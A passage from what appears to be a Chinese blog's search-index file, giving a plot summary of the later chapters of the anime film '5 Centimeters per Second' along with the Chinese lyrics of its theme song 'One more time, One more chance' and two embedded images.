<p>  1999年，高中三年级的夏天，不但受姐姐影响而在高中开始的滑浪陷入了低潮，而且也决定不了毕业后的出路。虽然花苗对贵树的思念愈来愈强烈，但只是为了装作偶然遇上而一起回家。在高中生活只剩下半年时，感到焦急的花苗做了一个决定：能够在滑浪时再次站起来，就向贵树表白。</p>
<p>  为此，花苗努力练习滑浪，成功地在滑浪时再次站起来。某日放学后，花苗打算向贵树告白，却发现贵树的心里并没有她，而忍住了告白，但依然喜欢着贵树。高中毕业后，贵树考取东京的大学。在其离开种子岛时，花苗前往机场目送贵树乘坐飞往东京的班机。</p>
<h3 id="3-秒速五厘米"><a href="#3-秒速五厘米" class="headerlink" title="3.秒速五厘米"></a>3.秒速五厘米</h3><p>   2007年的东京，远野贵树在从事系统工程师的工作，过着忙碌的日子。出来社会工作后，季节和季节、年和年之间的区分变得暧昧起来，不知不觉就过了数年。那年年尾，贵树和交往了3年的水野理纱分手了。</p>
<p>  2008年，贵树在春天来临前辞职了。他既觉得有无数的理由要他这样做，同时又觉得能令自己接受的理由其实一个也没有。不久空气慢慢变得暖和，樱花的季节也到访东京。在一个恬静的平日，中午过后，贵树披上薄外套，走在街上。 经过铁道时，与迎面而来的女子擦肩而过的瞬间，猛然想起了多年未见的明里。在通过铁道缓缓转过身，两人目光交错，就在心与记忆即将沸腾的瞬间，却被疾驰而过的小田急线列车挡住了视线。而在电车通过时贵树就已在心中下了决定，待电车通过后发现女子早已离去时微微一笑转过身去。</p>
<p>One more time,One more chance</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/u=674148120,2688654827&fm=206&gp=0.jpg" alt="ss" title="" class="">
                <p>ss</p>
            </figure>
<p>我一直在寻找 你遗落在某处的碎片<br>旅游地的店里 报纸的角落<br>明知道你不可能出现<br>如果会有奇迹发生 我好想马上让你看到<br>全新的早晨 今后的我<br>还有那句无法说出口的“我喜欢你”<br>我随时都会不禁想要寻找 你在某处的笑容<br>等待快速列车通过的平行道<br>明知道你不可能出现<br>如果生命能够重来 不论与你相遇几次我都愿意<br>我已经别无所求 因为没有什么东西比你更重要.</p>
<div style="text-align: center;"><br><br><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/8dc85e36acaf2eddb67433ee891001e938019375.jpg" alt="ssw" title="" class="">
                <p>ssw</p>
            </figure><br><br></div>

]]></content>
      
        <categories>
            
            <category> 樱花抄 宇航员 秒速五厘米 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
